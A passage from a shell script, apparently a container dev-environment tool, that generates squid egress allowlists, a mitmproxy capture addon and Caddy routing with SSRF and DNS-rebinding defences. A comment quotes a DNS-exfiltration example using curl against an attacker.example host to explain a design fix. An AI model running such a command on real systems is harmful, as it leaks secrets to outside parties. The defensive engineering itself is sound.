          .*)        doms="$doms $d";;          # .foo  → as-is (subdomains)
          *[!0-9.]*) doms="$doms $d";;          # plain → EXACT host only
          *)         ips="$ips $d";;
        esac
      done < "$pdir/allowed_hosts"
    fi
    # Decide on the NAME before anything that needs an ADDRESS.
    # A `dst` ACL makes squid resolve the requested hostname — for DENIED hosts
    # too — so `curl -x proxy http://<secret>.attacker.example/` leaked data to
    # the attacker's DNS server despite TCP_DENIED. Names and IPs therefore share
    # ONE `dstdomain -n` list: `-n` stops the reverse lookup squid would otherwise
    # do for an IP-literal URL, and an IP entry matches a request addressed to
    # that IP literally. Trade-off: an allowed IP no longer also allows a
    # hostname that happens to resolve to it — that would need the lookup.
    all_srcs="$all_srcs $subnet"
    acls="$acls
acl p_$aclname src $subnet"
    if [ -n "$doms$ips" ]; then
      acls="$acls
acl d_$aclname dstdomain -n$doms$ips"
      gates="$gates
http_access deny p_$aclname !d_$aclname"
      allows="$allows
http_access allow p_$aclname d_$aclname"
    else
      gates="$gates
http_access deny p_$aclname"
    fi

    # CONNECT to port 22 (git over ssh) only for <project>/ssh_hosts,
    # when that file exists. No file = the old behaviour (every allowed host),
    # so existing projects keep working; init writes it with the forge host.
    # Entries are re-validated here because they land in squid.conf.
    if [ -f "$pdir/ssh_hosts" ]; then
      sshdoms=""
      while IFS= read -r d || [ -n "$d" ]; do
        d="$(normalize_allowed_host "${d%%#*}")" || continue
        sshdoms="$sshdoms $d"
      done < "$pdir/ssh_hosts"
      if [ -n "$sshdoms" ]; then
        acls="$acls
acl s_$aclname dstdomain -n$sshdoms"
        sshgates="$sshgates
http_access deny p_$aclname CONNECT ssh_port !s_$aclname"
      else
        sshgates="$sshgates
http_access deny p_$aclname CONNECT ssh_port"
      fi
    fi

    # Capture: this project's traffic goes through ITS OWN mitmproxy listener
    # (the port tells the addon which project a flow belongs to), AFTER squid
    # has applied every rule above. Ports 22/9418 (ssh, git://) are not HTTP —
    # they stay direct. never_direct makes it fail CLOSED: if mitmproxy is down
    # the request fails instead of silently going out unrecorded.
    if [ -f "$pdir/capture" ] && [ "$capn" -lt 99 ]; then
      capn=$((capn + 1))
      CAPTURE_PROJECTS="$CAPTURE_PROJECTS $name"
      if project_captures "$name" egress; then
        peers="$peers
cache_peer 127.0.0.1 parent $((CAPTURE_EGRESS_BASE + capn)) 0 no-query no-digest no-netdb-exchange name=cap_$aclname
cache_peer_access cap_$aclname allow p_$aclname !nocapture_ports
cache_peer_access cap_$aclname deny all
never_direct allow p_$aclname !nocapture_ports"
        capconf="${capconf}egress $name $((CAPTURE_EGRESS_BASE + capn))
"
      fi
      if project_captures "$name" ingress; then
        capconf="${capconf}ingress $name $((CAPTURE_INGRESS_BASE + capn)) $(container_name "$name")
"
        CAPTURE_INGRESS="$CAPTURE_INGRESS$name $((CAPTURE_INGRESS_BASE + capn))
"
      fi
    elif [ -f "$pdir/capture" ]; then
      warn "capture: more than 99 projects — '$name' is not captured"
    fi

    # Relays require the ports to be free on the host. If the project container
    # is RUNNING and still publishes its own ports (started before it became
    # restricted), publishing them here would collide and kill the proxy —
    # skip its relays and tell the user to recreate the project container.
    if container_running "$(container_name "$name")" && \
       "$ENGINE" port "$(container_name "$name")" 2>/dev/null | grep -q .; then
      warn "'$name' is running WITHOUT restriction (old container publishes its own ports)"
      warn "  apply it with:  $0 stop $name && $0 run $name   (skipping its relays for now)"
      continue
    fi

    # SSH relay: host ssh port → (proxy container, published) → project:2222.
    sshport="$(project_port "$name")"
    EGRESS_PUB+=(-p "127.0.0.1:$sshport:$sshport")
    relays="$relays
\"\$PROFILE/bin/socat\" TCP-LISTEN:$sshport,fork,reuseaddr\${RELAY_BIND:+,bind=\$RELAY_BIND} TCP:$(container_name "$name"):$SSHD_PORT &"

    # Extra declared ports (<project>/ports) relayed the same way.
    if [ -f "$pdir/ports" ]; then
      while IFS= read -r _line || [ -n "$_line" ]; do
        _spec="$(printf '%s' "${_line%%#*}" | tr -d '[:space:]')"
        [ -n "$_spec" ] || continue
        case "$_spec" in
          *:*:*) warn "restricted '$name': address port spec '$_spec' unsupported — skipped"; continue;;
          *:*) hp="${_spec%%:*}"; cp="${_spec#*:}";;
          *)   hp="$_spec"; cp="$_spec";;
        esac
        EGRESS_PUB+=(-p "127.0.0.1:$hp:$hp")
        relays="$relays
\"\$PROFILE/bin/socat\" TCP-LISTEN:$hp,fork,reuseaddr\${RELAY_BIND:+,bind=\$RELAY_BIND} TCP:$(container_name "$name"):$cp &"
      done < "$pdir/ports"
    fi
  done

  # 'deploy' networks: one per project with a deploy_hosts file, keyed by the
  # deploy net's subnet — never the project's, so the dev container gets none
  # of the deploy-only hosts. The deploy container gets the dev allowlist too.
  # Same shape as above: the NAME gate (no DNS) comes before 'to_localnets'.
  # Every allowed host may use every Connect_ports port, 22 included (no
  # ssh_hosts limit): ssh to those hosts is what a deploy is for.
  for pdir in "$PROJECTS_DIR"/*/; do
    [ -d "$pdir" ] || continue
    name="$(basename "$pdir")"
    [ -f "$pdir/deploy_hosts" ] || continue
    doms="$(deploy_allowlist "$name" | tr '\n' ' ')"
    [ -n "${doms// /}" ] || continue
    ensure_deploy_net "$name"
    subnet="$(net_subnet "$(deploy_net "$name")")"
    if [ -z "$subnet" ]; then
      warn "cannot determine subnet of $(deploy_net "$name") — skipping deploy egress for '$name'"
      continue
    fi
    EGRESS_DEPLOYS="$EGRESS_DEPLOYS $name"
    aclname="$(printf '%s' "$name" | tr -c 'a-zA-Z0-9' '_')"
    all_srcs="$all_srcs $subnet"
    acls="$acls
acl deploysrc_$aclname src $subnet
acl deploydst_$aclname dstdomain -n ${doms% }"
    gates="$gates
http_access deny deploysrc_$aclname !deploydst_$aclname"
    allows="$allows
http_access allow deploysrc_$aclname deploydst_$aclname"
  done

  if [ -n "$EGRESS_PROJECTS$EGRESS_DEPLOYS" ]; then
    cat > "$edir/squid.conf" <<EOF
# Generated by nixenv — egress allowlist for restricted projects. Do not edit
# (edit <project>/allowed_hosts and re-run 'proxy up' / 'allow' instead).
# Bind IPv4 explicitly: a bare port makes squid bind [::] which, without
# dual-stack (v6only=0), refuses the IPv4 connections containers actually make.
http_port 0.0.0.0:$EGRESS_PORT
visible_hostname $PROXY_NAME
pid_filename /data/run/squid.pid
access_log stdio:/data/egress.log buffer-size=0KB
cache_log /data/squid-cache.log
cache deny all
via off
forwarded_for delete

# Only tunnel to sane ports (https, ssh, http, git).
acl Connect_ports port 443 22 80 9418
acl ssh_port port 22
acl nocapture_ports port 22 9418
acl CONNECT method CONNECT

# Loopback, private/container networks and link-local (169.254.169.254 is the
# cloud metadata endpoint — the classic SSRF credential-theft target).
acl to_localnets dst 127.0.0.0/8 10.0.0.0/8 172.16.0.0/12 192.168.0.0/16 169.254.0.0/16 fc00::/7 fe80::/10 ::1/128
$acls
acl nixenv_projects src$all_srcs

# Captured projects ('nixenv capture'): forwarded to their mitmproxy listener
# on loopback instead of going direct. Routing only — http_access below still
# decides what is allowed at all, before anything is forwarded.$peers

# ORDER MATTERS. squid evaluates http_access top-down and stops at the
# first match, so every rule ABOVE the first 'dst' ACL decides without DNS.
# 'to_localnets' is a dst ACL — it resolves the hostname — so it must only be
# reached by requests whose NAME is already allowed. Denied names never reach it,
# and are never looked up.
#   1. unknown source          (src — no DNS)
#   2. bad CONNECT port        (method/port — no DNS)
#   3. port 22 limited to git hosts, where declared (port/dstdomain -n — no DNS)
#   4. per-project NAME gate   (dstdomain -n — no DNS)
#   5. private destinations    (dst — resolves, but only allowed names get here)
http_access deny !nixenv_projects
http_access deny CONNECT !Connect_ports$sshgates
$gates
http_access deny to_localnets
$allows
http_access deny all
EOF
  else
    rm -f "$edir/squid.conf"   # no restricted projects → start.sh skips squid
  fi

  write_capture_files "$capconf"

  # start.sh: socat relays + caddy (ingress) — caddy is PID 1. Squid is NOT
  # here any more: it runs in its own container (egress.sh), so restarting the
  # ingress proxy no longer cuts every restricted project off the network.
  local proxy_subnet; proxy_subnet="$(net_subnet "$PROXY_NET" 2>/dev/null || true)"
  cat > "$edir/start.sh" <<EOF
#!/bin/sh
# Generated by nixenv — proxy container startup (relays + ingress).
PROFILE="$PROFILE"
$(pick_addr_fn)
# The relays listen ONLY on the $PROXY_NET address — the one the host's
# published ports arrive on. Restricted projects reach this container through
# their --internal nets, which have no route to that address, so they can't use
# another project's relay to hit its services. Chosen by SUBNET, not position:
# after a restart 'hostname -I' may list an internal net first.
# Empty (address undetectable) falls back to the first address, then to all.
RELAY_BIND="\$(pick_addr "$proxy_subnet")"
[ -n "\$RELAY_BIND" ] || RELAY_BIND="\$(hostname -I 2>/dev/null | awk '{print \$1}')"
[ -n "\$RELAY_BIND" ] || echo "nixenv: could not detect the proxy address — relays listen on all interfaces" >&2$relays
exec "\$PROFILE/bin/caddy" run --config /etc/caddy/Caddyfile --adapter caddyfile
EOF
}

# Shell function (as text, for the generated scripts): print this container's
# address inside CIDR $1. Interface ORDER is not stable across restarts, so a
# container on several networks must pick its address by subnet.
pick_addr_fn() {
  cat <<'NIXENV_PICK_ADDR'
pick_addr() {
  [ -n "$1" ] || return 0
  hostname -I 2>/dev/null | tr ' ' '\n' | awk -v cidr="$1" '
    function n(s,  a) { split(s, a, "."); return ((a[1]*256 + a[2])*256 + a[3])*256 + a[4] }
    BEGIN { split(cidr, c, "/"); size = 2 ^ (32 - c[2]); net = int(n(c[1]) / size) }
    /^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$/ { if (int(n($0) / size) == net) { print; exit } }'
}
NIXENV_PICK_ADDR
}

# Is <project> capturing <egress|ingress>? <project>/capture lists the
# directions ('egress', 'ingress'); an empty file means both.
project_captures() {
  local f; f="$(project_dir "$1")/capture"
  [ -f "$f" ] || return 1
  grep -q '[a-z]' "$f" || return 0
  grep -qw -- "$2" "$f"
}

# Whether <project>'s container trusts the capture CA: while egress capture is
# on, and — dev-only trade-off — for good once it has been on (the marker
# <project>/capture-trust, written by 'capture on'). Trust needs a restart to
# change, and that restart killed whatever ran in the container (a Claude
# session); this way only the FIRST capture costs one. 'capture untrust' + a
# restart revokes it. Not in EXPORT_META_FILES: trust is decided per machine.
capture_ca_trusted() {
  [ -f "$(project_dir "$1")/capture-trust" ] || project_captures "$1" egress
}

# The directions <project> captures, as words ("egress ingress").
capture_directions() {
  local d out=""
  for d in egress ingress; do project_captures "$1" "$d" && out="$out $d"; done
  printf '%s' "${out# }"
}

# The egress container's files: capture.conf (mitmproxy listeners, from $1),
# the mitmproxy addon, the UI token and egress.sh. capture.conf is rewritten
# only when it changes, and CAPTURE_CHANGED=1 tells the caller to restart
# mitmproxy (its listeners are fixed at start).
write_capture_files() {
  local edir="$PROXY_DIR/egress" lsub="" conf
  # The link subnet: EGRESS_NET, shared ONLY by this container and Caddy. The
  # ingress listeners and the UI bind there, and the addon accepts ingress
  # connections from nowhere else.
  [ -n "$1" ] && lsub="$(net_subnet "$EGRESS_NET" 2>/dev/null || true)"
  conf="# Generated by nixenv — mitmproxy listeners for 'nixenv capture'. Do not edit.
$1"
  [ -n "$lsub" ] && conf="${conf}link $lsub
"
  if ! printf '%s' "$conf" | cmp -s - "$edir/capture.conf" 2>/dev/null; then
    printf '%s' "$conf" > "$edir/capture.conf"
    CAPTURE_CHANGED=1
  fi

  # Captures hold whatever crossed the wire — tokens, cookies, credentials:
  # owner-only. The UI password is generated once; the URL 'capture web' prints
  # carries it.
  mkdir -p "$EGRESS_DATA_DIR"
  chmod 700 "$EGRESS_DATA_DIR" 2>/dev/null || true
  if [ -n "$1" ] && [ ! -s "$EGRESS_DATA_DIR/mitmweb.token" ]; then
    ( umask 077; od -An -N16 -tx1 /dev/urandom | tr -d ' \n' > "$EGRESS_DATA_DIR/mitmweb.token" )
  fi

  {
    printf '#!/bin/sh\n# Generated by nixenv — egress container startup (squid + mitmproxy).\n'
    printf 'PROFILE="%s"\nWEB_PORT=%s\n' "$PROFILE" "$CAPTURE_WEB_IN_PORT"
    pick_addr_fn
    cat <<'NIXENV_EGRESS_SH'
mkdir -p /data/run /data/captures
chmod 700 /data/captures 2>/dev/null || true
# /data persists across recreations: a stale pid file makes squid FATAL with
# "already running" (the old PID exists in the NEW container's namespace).
# This container is freshly created, so nothing can be running — clear them.
rm -f /data/run/squid.pid /data/run/mitm.pid

# mitmproxy, supervised by this loop. It runs only while capture.conf lists
# listeners and re-reads it on every start: 'nixenv capture' changes listeners
# by killing it (pid in /data/run/mitm.pid), never by recreating the container.
capture_loop() {
  _warned=0
  while :; do
    if grep -qE '^(egress|ingress) ' /etc/egress/capture.conf 2>/dev/null; then
      if [ ! -x "$PROFILE/bin/mitmweb" ]; then
        [ "$_warned" = 1 ] || echo "nixenv: capture is on but mitmproxy is not in the store — run 'nixenv build'" >&2
        _warned=1; sleep 10; continue
      fi
      # The link subnet comes from capture.conf, re-read on every restart —
      # NOT baked into this script: this shell runs for the container's whole
      # life, and a container started before any 'capture on' would keep an
      # empty subnet, binding the UI to 127.0.0.1 where Caddy can't reach it
      # (502 on <project>-mitm) and silently dropping ingress listeners.
      _bind="$(pick_addr "$(sed -n 's/^link \([0-9./]*\)$/\1/p' /etc/egress/capture.conf | head -n 1)")"
      set --
      while read -r _kind _name _port _rest; do
        case "$_kind" in
          # Loopback only: squid is the only client. Bound anywhere else, a
          # project could use it as a proxy and skip squid's rules entirely.
          egress)  set -- "$@" --mode "regular@127.0.0.1:$_port" ;;
          ingress) [ -n "$_bind" ] && set -- "$@" --mode "regular@$_bind:$_port" ;;
        esac
      done < /etc/egress/capture.conf
      # No listener at all would make mitmproxy fall back to 0.0.0.0:8080.
      if [ "$#" -gt 0 ]; then
        "$PROFILE/bin/mitmweb" "$@" \
          --set confdir=/data/mitmproxy \
          --set web_open_browser=false \
          --set web_host="${_bind:-127.0.0.1}" --set web_port="$WEB_PORT" \
          --set web_password="$(cat /data/mitmweb.token 2>/dev/null)" \
          --set stream_large_bodies=1m \
          -s /etc/egress/nixenv_capture.py &
        echo "$!" > /data/run/mitm.pid
        wait "$!"
        rm -f /data/run/mitm.pid
      fi
    fi
    sleep 2
  done
}
capture_loop &

exec "$PROFILE/bin/squid" -f /etc/egress/squid.conf -N
NIXENV_EGRESS_SH
  } > "$edir/egress.sh"

  cat > "$edir/nixenv_capture.py" <<'NIXENV_CAPTURE_ADDON'
# Generated by nixenv — mitmproxy addon for 'nixenv capture'. Do not edit.
#
# Runs in the egress container, BEHIND squid: squid has already decided which
# NAMES a project may reach (and refused the rest without resolving them), and
# only then hands the request to this project's loopback listener. This addon:
#   * tags every flow with its project (listener port → project, from
#     capture.conf) and appends it to /data/captures/<project>.flows + .log;
#   * re-checks the ADDRESS: mitmproxy resolves the name again, and a second
#     answer could point somewhere private (DNS rebinding). Non-public answers
#     are refused and the connection is pinned to the address that was checked;
#   * ingress listeners (Caddy → project) only accept the ingress proxy, and
#     only connect to their own project's container.
import asyncio
import ipaddress
import logging
import os
import socket
import time

from mitmproxy import http, io

os.umask(0o077)   # captures hold tokens/cookies: owner-only
CONF = os.environ.get("NIXENV_CAPTURE_CONF", "/etc/egress/capture.conf")
OUT = os.environ.get("NIXENV_CAPTURE_DIR", "/data/captures")
UPSTREAM_HEADER = "X-Nixenv-Upstream"


def load_conf(path):
    """capture.conf lines: 'egress <project> <port>',
    'ingress <project> <port> <container>', 'link <subnet>'."""
    listeners, links = {}, []
    with open(path) as f:
        for line in f:
            p = line.split()
            if not p or p[0].startswith("#"):
                continue
            if p[0] == "egress" and len(p) == 3:
                listeners[int(p[2])] = ("egress", p[1], None)
            elif p[0] == "ingress" and len(p) == 4:
                listeners[int(p[2])] = ("ingress", p[1], p[3])
            elif p[0] == "link" and len(p) == 2:
                links.append(ipaddress.ip_network(p[1], strict=False))
    return listeners, links


def public(ip):
    a = ipaddress.ip_address(ip)
    if a.version == 6 and a.ipv4_mapped:
        a = a.ipv4_mapped
    return a.is_global


class Capture:
    def __init__(self):
        self.listeners, self.links = load_conf(CONF)
        self.files = {}

    def who(self, conn):
        try:
            return self.listeners.get(conn.sockname[1])
        except (AttributeError, IndexError, TypeError):
            return None

    def client_connected(self, client):
        w = self.who(client)
        if w is None:
            client.error = "nixenv: unknown capture listener"
        elif w[0] == "ingress":
            peer = ipaddress.ip_address(client.peername[0])
            if not any(peer in n for n in self.links):
                client.error = "nixenv: ingress capture only accepts the ingress proxy"

    async def server_connect(self, data):
        w = self.who(data.client)
        if w is None:
            data.server.error = "nixenv: unknown capture listener"
            return
        kind, project, target = w
        host, port = data.server.address
        if kind == "ingress":
            if host != target:
                data.server.error = f"nixenv: ingress capture for {project} only reaches {target}"
            return
        try:
            infos = await asyncio.get_running_loop().getaddrinfo(
                host, port, type=socket.SOCK_STREAM)
        except OSError as e:
            data.server.error = f"nixenv: cannot resolve {host}: {e}"
            return
        ips = sorted({i[4][0] for i in infos}, key=lambda ip: ":" in ip)  # IPv4 first
        if not ips or not all(public(ip) for ip in ips):
            data.server.error = f"nixenv: {host} resolves to a non-public address — refused"
            return
        data.server.address = (ips[0], port)

    def requestheaders(self, flow):
        w = self.who(flow.client_conn)
        if not w:
            return
        flow.comment = f"{w[1]} {w[0]}"   # mitmweb filter: ~comment <project>
        if w[0] == "ingress":
            if flow.is_replay == "request":
                # A replay (mitmweb, tui) re-sends the RECORDED request: already
                # rewritten to the container, header already stripped. Keep it
                # pointed at this project's container only; server_connect
                # enforces the same.
                flow.request.headers.pop(UPSTREAM_HEADER, None)
                if flow.request.host != w[2]:
                    flow.response = http.Response.make(
                        502, f"nixenv: replay for {w[1]} only reaches {w[2]}\n".encode())
                return
            # Caddy names the upstream it chose in this header (it sends the
            # PUBLIC host as the proxy target). Only this project's container.
            up = flow.request.headers.pop(UPSTREAM_HEADER, "")
            host, _, port = up.rpartition(":")
            if host != w[2] or not port.isdigit():
                flow.response = http.Response.make(
                    502, f"nixenv: bad ingress upstream {up!r}\n".encode())
                return
            public_host = flow.request.headers.get("host")
            flow.request.host, flow.request.port = host, int(port)
            if public_host is not None:   # .host= rewrote it; the app wants the public one
                flow.request.headers["host"] = public_host

    def responseheaders(self, flow):
        # Never buffer an event stream: the client would wait forever.
        if flow.response.headers.get("content-type", "").startswith("text/event-stream"):
            flow.response.stream = True

    def response(self, flow):
        self.save(flow)

    def error(self, flow):
        self.save(flow)

    def tls_failed_client(self, data):
        w = self.who(data.context.client)
        if w:
            msg = (f"{w[1]}: client refused the capture certificate for "
                   f"{data.context.client.sni or '?'} (certificate pinning, or the "
                   f"container predates 'capture on' — restart it)")
            logging.warning("nixenv: %s", msg)
            self.line(w[1], f"{self.now()} {w[0]:7} TLS-REFUSED {data.context.client.sni or '?'}")

    @staticmethod
    def now():
        return time.strftime("%Y-%m-%dT%H:%M:%S")

    def handles(self, project):
        h = self.files.get(project)
        if h is None:
            os.makedirs(OUT, exist_ok=True)
            fh = open(os.path.join(OUT, project + ".flows"), "ab")
            lg = open(os.path.join(OUT, project + ".log"), "a", buffering=1)
            h = self.files[project] = (fh, io.FlowWriter(fh), lg)
        return h

    def line(self, project, text):
        self.handles(project)[2].write(text + "\n")

    def save(self, flow):
        w = self.who(flow.client_conn)
        if not w:
            return
        fh, writer, _ = self.handles(w[1])
        writer.add(flow)
        fh.flush()
        r = flow.request
        if flow.response:
            status = str(flow.response.status_code)
            size = len(flow.response.raw_content or b"")
        else:
            status = "ERR(" + (flow.error.msg if flow.error else "?") + ")"
            size = 0
        self.line(w[1], f"{self.now()} {w[0]:7} {r.method} {r.pretty_url} {status} {size}")


addons = [Capture()]
NIXENV_CAPTURE_ADDON
}

# Opt-in: <target>/accept-from lists the projects allowed to reach the
# target's web services through the proxy (names, whitespace/newline separated,
# '#' comments; '*' = every project). Absent → only the target itself.
# Anything that isn't a valid project name is dropped: these end up in a regex.
project_accept_from() {
  local f; f="$(project_dir "$1")/accept-from"
  [ -f "$f" ] || return 0
  sed 's/#.*//' "$f" | tr ' \t' '\n\n' | while IFS= read -r t; do
    case "$t" in
      "") ;;
      \*) echo '*' ;;
      -*|*[!a-zA-Z0-9_-]*) echo "nixenv: $f: ignoring invalid project name '$t'" >&2 ;;
      *) echo "$t" ;;
    esac
  done
}
# Does <target> accept requests from <origin>?
project_accepts() {
  project_accept_from "$1" 2>/dev/null | grep -qxF -e "$2" -e '*'
}

# Caddy matchers + deny lines for the cross-project guard, from EGRESS_SUBNETS (set by
# write_egress_configs). Prints two sections separated by a line "--": the
# named matchers, then the respond lines. A request arriving from a restricted
# project's --internal subnet may only target that project, or a project whose
# accept-from names it.
caddy_isolation_rules() {
  local dom_re="$1" name subnet id targets tdir t matchers="" denies=""
  while read -r name subnet; do
    [ -n "$name" ] && [ -n "$subnet" ] || continue
    case "$name" in -*|*[!a-zA-Z0-9_-]*) continue;; esac
    targets="$name"
    for tdir in "$PROJECTS_DIR"/*/; do
      [ -d "$tdir" ] || continue
      t="$(basename "$tdir")"
      [ "$t" = "$name" ] && continue
      case "$t" in -*|*[!a-zA-Z0-9_-]*) continue;; esac
      project_accepts "$t" "$name" && targets="$targets|$t"
    done
    id="$(printf '%s' "$name" | tr -c 'a-zA-Z0-9' '_')"
    matchers="$matchers
	@xproj_$id {
		remote_ip $subnet
		not header_regexp Host ^($targets)-[0-9]+\\.$dom_re(:[0-9]+)?\$
	}"
    denies="$denies
		respond @xproj_$id \"nixenv proxy: project '$name' may not reach {host} (add '$name' to the target's accept-from)\" 403"
  done <<EOF
${EGRESS_SUBNETS:-}
EOF
  printf '%s\n--\n%s\n' "$matchers" "$denies"
}

# Public URL of the mitmweb UI for a captured project (Caddy routes it).
capture_ui_url() {
  local port=""
  [ "$PROXY_HTTPS_PORT" = 443 ] || port=":$PROXY_HTTPS_PORT"
  printf 'https://%s-mitm.%s%s' "$1" "$PROXY_DOMAIN" "$port"
}

# Caddy matchers + routes for capture, from CAPTURE_PROJECTS and CAPTURE_INGRESS
# ("name port" lines), both set by write_egress_configs. Every captured project
# gets <name>-mitm.<domain> → the mitmweb UI (one instance, on the link net, so
# only Caddy can reach it; the token is still required). Never a restricted
# project: the cross-project guard above only lets it reach <self|peer>-<digits>.
# Ingress: Same two-section output as above. Such a
# project's requests go to its upstream THROUGH its mitmproxy ingress listener;
# Caddy sends the PUBLIC host as the proxy target, so the upstream it chose
# travels in X-Nixenv-Upstream (set here, overwriting anything a client sent;
# the addon accepts only this project's container and strips it).
caddy_capture_routes() {
  local dom_re="$1" name port id matchers="" routes=""
  for name in ${CAPTURE_PROJECTS:-}; do
    case "$name" in -*|*[!a-zA-Z0-9_-]*) continue;; esac
    id="$(printf '%s' "$name" | tr -c 'a-zA-Z0-9' '_')"
    matchers="$matchers
	@capui_$id host $name-mitm.$PROXY_DOMAIN"
    routes="$routes
		# 'nixenv capture $name web': the mitmweb UI (Host kept: its websocket checks Origin).
		reverse_proxy @capui_$id $EGRESS_LINK:$CAPTURE_WEB_IN_PORT {
			flush_interval -1
		}"
  done
  while read -r name port; do
    [ -n "$name" ] && [ -n "$port" ] || continue
    case "$name" in -*|*[!a-zA-Z0-9_-]*) continue;; esac
    case "$port" in *[!0-9]*) continue;; esac
    id="$(printf '%s' "$name" | tr -c 'a-zA-Z0-9' '_')"
    matchers="$matchers
	@cap_$id header_regexp cap_$id Host ^$name-([0-9]+)\\.$dom_re(:[0-9]+)?\$"
    routes="$routes
		# 'nixenv capture $name': recorded by mitmproxy on the way in.
		reverse_proxy @cap_$id $CONTAINER_PREFIX-$name:{re.cap_$id.1} {
			transport http {
				forward_proxy_url http://$EGRESS_LINK:$port
			}
			header_up X-Nixenv-Upstream $CONTAINER_PREFIX-$name:{re.cap_$id.1}
			header_up X-Forwarded-Proto https
			header_up X-Forwarded-Port 443
			header_up X-Real-IP {http.request.remote.host}
			flush_interval -1
		}"
  done <<EOF
${CAPTURE_INGRESS:-}
EOF
  printf '%s\n--\n%s\n' "$matchers" "$routes"
}

# Write $PROXY_DIR/Caddyfile. $1=1 → use the mkcert wildcard cert, else internal.
# Call write_egress_configs FIRST: the cross-project guard needs EGRESS_SUBNETS,
# and ingress capture needs CAPTURE_INGRESS.
write_caddyfile() {
  local tls_line dom_re rules guards denies caps capmatch caproutes
  mkdir -p "$PROXY_DIR"
  dom_re="$(printf '%s' "$PROXY_DOMAIN" | sed 's/\./\\./g')"
  if [ "${1:-0}" = 1 ]; then
    tls_line="tls /certs/wildcard.pem /certs/wildcard-key.pem"
  else
    tls_line="tls internal"
  fi
  rules="$(caddy_isolation_rules "$dom_re")"
  guards="$(printf '%s\n' "$rules" | sed '/^--$/,$d')"
  denies="$(printf '%s\n' "$rules" | sed '1,/^--$/d')"
  caps="$(caddy_capture_routes "$dom_re")"
  capmatch="$(printf '%s\n' "$caps" | sed '/^--$/,$d')"
  caproutes="$(printf '%s\n' "$caps" | sed '1,/^--$/d')"
  # Unquoted heredoc: $vars expand; Caddy's {re.route.N}/{host} have no $ so stay
  # literal; \. and \$ are preserved/reduced to regex-correct forms.
  cat > "$PROXY_DIR/Caddyfile" <<CADDY
{
	# Standard ports IN-CONTAINER: the proxy runs with
	# net.ipv4.ip_unprivileged_port_start=0 so non-root caddy can bind them.
	# This is what lets a project reach another project's PUBLIC URL from inside
	# (https://<project>-<port>.$PROXY_DOMAIN/ with no :port suffix).
	http_port 80
	https_port 443
}

*.$PROXY_DOMAIN {
	$tls_line
	# Project names are [a-zA-Z0-9_-] (valid_project_name) — nothing looser.
	@route header_regexp route Host ^([a-zA-Z0-9_-]+)-([0-9]+)\.$dom_re(:[0-9]+)?\$
$guards$capmatch
	# 'route' keeps this order literally (Caddy would otherwise sort directives).
	route {
		# A restricted project may only reach ITSELF through the proxy,
		# unless the target lists it in <target>/accept-from. Identified by the
		# source subnet of its --internal network. Host requests and unrestricted
		# projects (flat $PROXY_NET, reachable directly anyway) are not guarded.
$denies$caproutes
		reverse_proxy @route $CONTAINER_PREFIX-{re.route.1}:{re.route.2} {
			# Caddy already adds X-Forwarded-For/Proto/Host; make the TLS-terminated
			# scheme explicit (443 is mapped to caddy's 8443) and add a couple more
			# so backends (e.g. Symfony behind trusted_proxies) generate https URLs.
			header_up X-Forwarded-Proto https
			header_up X-Forwarded-Port 443
			header_up X-Real-IP {http.request.remote.host}
			# Stream responses through unbuffered (nginx: proxy_buffering off) —
			# SSE, chunked output, dev-server live reload. WebSockets need nothing.
			flush_interval -1
		}
		respond "nixenv proxy: no route for {host} — use <project>-<port>.$PROXY_DOMAIN" 502
	}
}
CADDY
}

cmd_proxy() {
  require_engine
  local sub="${1:-up}"
  case "$sub" in
    up|start|restart)
      volume_exists && store_is_populated || die "shared store not built — run '$0 build' first (caddy comes from it)"
      ensure_proxy_net
      ensure_egress_net
      mkdir -p "$PROXY_DIR/data"
      local cert=0; proxy_make_cert && cert=1 || cert=0
      write_egress_configs   # squid ACLs + relays + start.sh (fills EGRESS_PUB/PROJECTS/SUBNETS)
      write_caddyfile "$cert"   # after: its cross-project guard needs EGRESS_SUBNETS
      # Egress FIRST: restricted projects have no other way out, and it is left
      # running (reloaded, not recreated) while Caddy is recreated below.
      egress_up
      local certmount; certmount=()
      [ "$cert" = 1 ] && certmount=(-v "$PROXY_DIR/certs:/certs:ro")
      "$ENGINE" rm -f "$PROXY_NAME" >/dev/null 2>&1 || true
      log "Starting proxy '$PROXY_NAME' — *.$PROXY_DOMAIN on 127.0.0.1:$PROXY_HTTP_PORT/$PROXY_HTTPS_PORT"
      "$ENGINE" run -d \
        --name "$PROXY_NAME" \
        --network "$PROXY_NET" \
        --user "$(id -u):$(id -g)" \
        $(engine_userns) \
        $(container_hardening_args) \
        --sysctl net.ipv4.ip_unprivileged_port_start=0 \
        -p "127.0.0.1:$PROXY_HTTP_PORT:80" \
        -p "127.0.0.1:$PROXY_HTTPS_PORT:443" \
        ${EGRESS_PUB[@]+"${EGRESS_PUB[@]}"} \
        -v "$NIX_VOLUME":/nix:ro \
        -v "$PROXY_DIR/Caddyfile":/etc/caddy/Caddyfile:ro \
        -v "$PROXY_DIR/egress":/etc/egress:ro \
        ${certmount[@]+"${certmount[@]}"} \
        -v "$PROXY_DIR/data":/data \
        -e HOME=/data -e XDG_DATA_HOME=/data -e XDG_CONFIG_HOME=/data/config \
        -w /data \
        "$(img "$RUNTIME_IMAGE")" \
        sh /etc/egress/start.sh >/dev/null \
        || die "failed to start proxy container"
      # Join every restricted project's internal net so caddy can ingress-route
      # to it, and the egress net — the link ingress capture goes over.
      local rp
      for rp in $EGRESS_PROJECTS; do
        "$ENGINE" network connect "$(internal_net "$rp")" "$PROXY_NAME" >/dev/null 2>&1 || true
      done
      "$ENGINE" network connect "$EGRESS_NET" "$PROXY_NAME" >/dev/null 2>&1 || true
      # Name every running restricted project still wired the old way (e.g.
      # created when squid ran in this container): it has no network now.
      for rp in $EGRESS_PROJECTS; do
        if container_running "$(container_name "$rp")"; then
          container_needs_recreate "$rp" 1 || true
        fi
      done
      # Caddy writes its internal CA on first start; give it a moment, then
      # publish it so containers can trust the certs it serves.
      sleep 2; export_caddy_ca || true
      ok "proxy running as '$PROXY_NAME'"
      echo "   scheme: https://<project>-<port>.$PROXY_DOMAIN/   (e.g. https://myapp-3000.$PROXY_DOMAIN/)"
      if [ "$cert" = 1 ]; then echo "   tls:    trusted wildcard cert via mkcert"
      else echo "   tls:    Caddy internal CA (browser warning until you install/trust mkcert)"; fi
      echo "   net:    $PROXY_NET  (projects auto-join on '$0 run')"
      [ -n "$EGRESS_PROJECTS" ] && echo "   egress: squid allowlist in '$EGRESS_NAME' :$EGRESS_PORT for:$EGRESS_PROJECTS  (log: $0 egress <project>)"
      [ -n "$CAPTURE_PROJECTS" ] && echo "   capture:$CAPTURE_PROJECTS  (UI: $0 capture <project> web)"
